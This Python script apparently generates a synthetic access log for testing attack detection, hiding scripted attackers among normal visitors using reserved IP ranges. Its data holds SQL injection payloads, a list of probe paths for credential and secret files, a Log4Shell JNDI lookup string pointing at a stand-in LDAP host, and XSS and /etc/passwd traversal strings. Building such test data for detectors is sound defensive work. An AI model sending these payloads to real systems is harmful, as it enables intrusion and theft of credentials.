"""Generate a synthetic access log with known attackers hidden in normal traffic.

    python samples/generate.py samples/access.log.gz
    python samples/generate.py big.log --visitors 60000   # for benchmarks

Every IP comes from ranges reserved for documentation, benchmarking or carrier NAT
(RFC 5737, RFC 2544, RFC 6598), so no real address is labelled as an attacker.
"""

from __future__ import annotations

import argparse
import gzip
import random
from datetime import datetime, timedelta, timezone

BANGKOK = timezone(timedelta(hours=7))
START = int(datetime(2026, 10, 20, 8, 0, tzinfo=BANGKOK).timestamp())
DURATION = 2 * 3600

BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/141.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "Version/26.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 26_0 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 15; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/141.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0",
]
PAGES = [
    "/",
    "/blog",
    "/about",
    "/pricing",
    "/docs",
    "/docs/install",
    "/docs/config",
    "/contact",
] + [f"/blog/post-{n}" for n in range(1, 41)]
ASSETS = ["/static/app.css", "/static/app.js", "/static/logo.svg", "/favicon.ico"]
PROBES = [
    "/.env",
    "/.git/config",
    "/.git/HEAD",
    "/.aws/credentials",
    "/.DS_Store",
    "/wp-login.php",
    "/wp-config.php.bak",
    "/wp-admin/setup-config.php",
    "/phpmyadmin/",
    "/pma/",
    "/adminer.php",
    "/cgi-bin/luci",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/actuator/env",
    "/actuator/health",
    "/boaform/admin/formLogin",
    "/HNAP1/",
    "/server-status",
    "/_ignition/health-check",
    "/telescope/requests",
    "/solr/admin/info/system",
    "/manager/html",
    "/config.json",
    "/config.php",
    "/backup.zip",
    "/db.sql",
    "/site.tar.gz",
    "/index.php.bak",
    "/.svn/entries",
    "/.htpasswd",
    "/.vscode/sftp.json",
    "/.docker/config.json",
    "/jenkins/login",
    "/setup.cgi",
    "/.ssh/id_rsa",
    "/dump.sql",
    "/www.zip",
    "/database.sql",
    "/config.yml",
    "/.env.production",
    "/.env.local",
    "/.idea/workspace.xml",
    "/xmlrpc.php",
    "/web.config.old",
    "/settings.php.save",
]
SQLMAP_PAYLOADS = [
    "1' AND 1=1-- -",
    "1' AND SLEEP(5)-- -",
    "1 UNION ALL SELECT NULL,NULL,NULL-- -",
    "1' OR '1'='1",
    "1); SELECT PG_SLEEP(5)--",
    "1 AND (SELECT * FROM information_schema.tables)",
    "1' AND BENCHMARK(5000000,MD5(1))-- -",
    "-1 UNION SELECT username,password FROM users",
]


def stamp(ts: int) -> str:
    return datetime.fromtimestamp(ts, BANGKOK).strftime("%d/%b/%Y:%H:%M:%S %z")


class Log:
    def __init__(self, rng: random.Random) -> None:
        self.rng = rng
        self.entries: list[tuple[int, str]] = []

    def add(
        self,
        ts: int,
        ip: str,
        method: str,
        target: str,
        status: int,
        agent: str,
        referer: str = "-",
    ) -> None:
        size = self.rng.randint(180, 48000) if status == 200 else self.rng.randint(0, 600)
        line = (
            f'{ip} - - [{stamp(ts)}] "{method} {target} HTTP/1.1" {status} {size} '
            f'"{referer}" "{agent}"'
        )
        self.entries.append((ts, line))


def cgnat_ip(rng: random.Random) -> str:  # 100.64.0.0/10, RFC 6598
    return f"100.{rng.randint(64, 127)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"


def visitors(log: Log, rng: random.Random, count: int) -> None:
    for _ in range(count):
        ip, agent = cgnat_ip(rng), rng.choice(BROWSERS)
        for _ in range(rng.randint(1, 3)):
            ts = START + rng.randint(0, DURATION - 600)
            referer = "-"
            for _ in range(rng.randint(1, 6)):
                page = rng.choice(PAGES)
                log.add(ts, ip, "GET", page, 200, agent, referer)
                for asset in ASSETS:
                    status = 304 if rng.random() < 0.6 else 200
                    if asset == "/favicon.ico" and rng.random() < 0.1:
                        status = 404
                    log.add(
                        ts + rng.randint(0, 1),
                        ip,
                        "GET",
                        asset,
                        status,
                        agent,
                        "https://example.com" + page,
                    )
                referer = "https://example.com" + page
                ts += rng.randint(5, 90)


def well_behaved_bots(log: Log, rng: random.Random) -> None:
    crawler = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    for i in range(420):
        page = PAGES[i % len(PAGES)]
        log.add(START + i * 17, "198.51.100.10", "GET", page, 200, crawler)
    for minute in range(DURATION // 60):  # uptime check every minute
        log.add(START + minute * 60, "192.0.2.10", "GET", "/health", 200, "curl/8.5.0")


def attackers(log: Log, rng: random.Random) -> None:
    sqlmap = "sqlmap/1.8.4#stable (https://sqlmap.org)"
    ts = START + 1800
    for i in range(320):
        payload = rng.choice(SQLMAP_PAYLOADS).replace(" ", "%20").replace("'", "%27")
        log.add(
            ts + i * 2,
            "203.0.113.66",
            "GET",
            f"/search?q={payload}",
            rng.choice((200, 500)),
            sqlmap,
        )

    ts = START + 2400
    for i, path in enumerate(PROBES):
        log.add(ts + i, "203.0.113.23", "GET", path, 404, "Go-http-client/1.1")

    ts = START + 3000
    log.add(ts, "192.0.2.77", "GET", "/wp-login.php", 200, "python-requests/2.32.3")
    for i in range(240):
        log.add(
            ts + 2 + i * 2, "192.0.2.77", "POST", "/wp-login.php", 200, "python-requests/2.32.3"
        )

    ts = START + 4200
    for i in range(1800):
        status = 200 if i < 700 else 429
        target = "/" if i % 2 else "/search?q=sale"
        log.add(ts + i // 10, "198.51.100.200", "GET", target, status, BROWSERS[0])

    jndi = "${jndi:ldap://203.0.113.140:1389/Exploit}"
    for i, target in enumerate(
        (
            f"/?x={jndi}",
            "/<script>alert(document.domain)</script>",
            "/static/../../../../etc/passwd",
        )
    ):
        log.add(START + 5000 + i * 30, "203.0.113.140", "GET", target, 400, jndi)

    # 19 IPs, a believable Firefox User-Agent, eight login attempts each spread over
    # two hours. No single IP crosses a threshold; together they make 152 attempts.
    botnet_agent = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0"
    )
    hosts = [f"198.18.{rng.randint(0, 255)}.{rng.randint(1, 254)}" for _ in range(9)]
    hosts += [f"198.19.{rng.randint(0, 255)}.{rng.randint(1, 254)}" for _ in range(6)]
    hosts += [f"192.0.2.{n}" for n in (131, 132)] + [f"203.0.113.{n}" for n in (201, 202)]
    for ip in hosts:
        for _ in range(8):
            log.add(START + rng.randint(0, DURATION), ip, "POST", "/xmlrpc.php", 200, botnet_agent)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("output", help="where to write the log (.gz is compressed)")
    parser.add_argument("--visitors", type=int, default=450, help="normal visitors")
    parser.add_argument("--seed", type=int, default=7)
    args = parser.parse_args()

    rng = random.Random(args.seed)
    log = Log(rng)
    visitors(log, rng, args.visitors)
    well_behaved_bots(log, rng)
    attackers(log, rng)
    log.entries.sort(key=lambda entry: entry[0])

    data = "".join(line + "\n" for _, line in log.entries).encode("utf-8")
    with open(args.output, "wb") as handle:
        if args.output.endswith(".gz"):
            # No name or mtime in the header, so the file is byte-identical between runs.
            with gzip.GzipFile(filename="", mode="wb", fileobj=handle, mtime=0) as packed:
                packed.write(data)
        else:
            handle.write(data)
    print(f"wrote {len(log.entries):,} lines to {args.output}")


if __name__ == "__main__":
    main()
